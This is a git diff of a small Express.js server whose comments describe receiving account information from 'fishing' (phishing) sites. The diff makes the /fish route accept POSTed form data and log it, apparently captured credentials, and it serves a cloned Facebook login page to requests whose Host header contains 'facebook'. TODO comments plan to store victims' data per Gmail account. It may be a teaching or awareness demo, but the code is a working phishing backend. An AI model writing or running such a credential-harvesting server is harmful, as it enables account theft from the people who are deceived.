@@ -1,11 +1,17 @@
 const express = require('express');
+const path = require('path');
 const app = express();
 const port = 5001
 
+app.use(express.static(path.join(__dirname, '../frontend')));
+
 // Receive the account information from fishing sites.
-app.get('/fish', function(request, response){
+app.post('/fish', function(request, response){
     // TODO: Get account information and store into the coressponding json file according to gmail account.
-    
+    const host = request.headers.host
+    console.log(host)
+    console.log(request.url);
+    console.log(request.body);
     
     // Redirect to introduction page.
     response.redirect('introduction')
@@ -30,6 +36,8 @@ app.all('*', function(request, response){
     // TODO: Redirect to fishing sites based on the request url.
     const host = request.headers.host
     console.log(host)
+    console.log(request.url);
+    
     if (host.includes('facebook')){
         response.sendFile('frontend/facebook/index.html', {root: '../'});
     }
